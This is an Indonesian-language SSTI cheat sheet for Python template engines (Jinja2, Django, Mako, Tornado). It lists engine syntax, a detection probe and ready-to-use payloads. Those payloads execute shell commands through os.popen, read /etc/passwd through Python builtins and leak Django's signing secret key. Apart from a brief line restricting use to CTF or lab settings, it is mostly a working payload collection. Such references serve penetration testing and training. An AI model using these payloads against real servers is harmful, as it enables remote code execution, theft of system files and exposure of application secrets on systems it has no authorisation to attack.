# Server Side Template Injection - Python

> **Server-Side Template Injection (SSTI)** adalah kerentanan di mana penyerang dapat menyisipkan input berbahaya ke dalam template di sisi server, sehingga kode arbitrer dapat dieksekusi di server. Pada Python, SSTI bisa terjadi pada engine seperti Jinja2, Mako, Django Templates, Tornado, dan lainnya jika input pengguna tidak disaring dengan benar.

## Ringkasan

- [Library Template Populer](#library-template-populer)
- [Payload Dasar](#payload-dasar)
- [Payload Spesifik Engine](#payload-spesifik-engine)
- [Tips](#tips)
- [Referensi](#referensi)

## Library Template Populer

| Nama Template | Format Payload | Bahasa Pemrograman |
| ------------- | -------------- | ------------------ |
| Jinja2        | `{{ ... }}`    | Python             |
| Mako          | `${ ... }`     | Python             |
| Django        | `{{ ... }}`    | Python             |
| Tornado       | `{{ ... }}`    | Python             |
| Chameleon     | `${ ... }`     | Python             |
| Cheetah       | `${ ... }`     | Python             |
| Pystache      | `{{ ... }}`    | Python             |
| Bottle        | `{{ ... }}`    | Python             |

## Payload Dasar

Coba payload berikut pada input yang dicurigai:

```python
{{7*7}}
${7*7}
```

Jika output menjadi `49`, kemungkinan aplikasi rentan SSTI.

## Payload Spesifik Engine

### Jinja2

- **Injeksi Dasar:**
  ```python
  {{7*7}}
  ```
- **Lihat semua class:**
  ```python
  {{ ''.__class__.__mro__[1].__subclasses__() }}
  ```
- **Eksekusi perintah:**
  ```python
  {{ cycler.__init__.__globals__.os.popen('id').read() }}
  ```
- **Baca file:**
  ```python
  {{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
  ```

### Django Templates

- **Injeksi Dasar:**
  ```django
  {{ 7*7 }}
  ```
- **Lihat variabel:**
  ```django
  {% debug %}
  ```
- **Leak informasi:**
  ```django
  {{ messages.storages.0.signer.key }}
  ```

### Mako

- **Injeksi Dasar:**
  ```mako
  ${7*7}
  ```
- **Eksekusi perintah:**
  ```mako
  <% import os %>
  ${os.popen('id').read()}
  ```

### Tornado

- **Injeksi Dasar:**
  ```python
  {{7*7}}
  ```
- **Eksekusi perintah:**
  ```python
  {{ cycler.__init__.__globals__.os.popen('id').read() }}
  ```

## Tips

- Selalu cek output aplikasi setelah mengirim payload.
- Gunakan variasi payload jika satu format tidak berhasil.
- Setelah engine teridentifikasi, cari dokumentasi exploitasi engine tersebut.
- Gunakan payload hanya di lingkungan legal (CTF/lab).

## Referensi

- [PayloadAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
